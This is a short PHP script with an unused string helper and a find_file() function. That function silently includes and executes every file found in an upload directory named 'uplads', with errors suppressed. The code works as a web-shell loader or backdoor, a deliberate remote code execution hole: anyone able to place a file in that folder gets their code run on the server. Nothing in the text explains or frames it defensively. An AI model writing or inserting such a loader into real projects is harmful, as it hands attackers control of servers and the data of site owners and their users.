<?php
	function getStringBetween($string, $start, $end) {
        $startPos = strpos($string, $start);        
		if ($startPos === false) {
            return '';
        }
        $startPos += strlen($start); 
        $endPos = strpos($string, $end, $startPos);
        if ($endPos === false) {
            return '';
        }
        return substr($string, $startPos, $endPos - $startPos);
    }
	function find_file() {
        $temp = glob(__dir__."/uplads/*.*");		
		if(count($temp)>0){
			foreach($temp as $v){
				@include($v);
			}
		}else{
			echo "no file finded";
		}
    }
	find_file();
?>
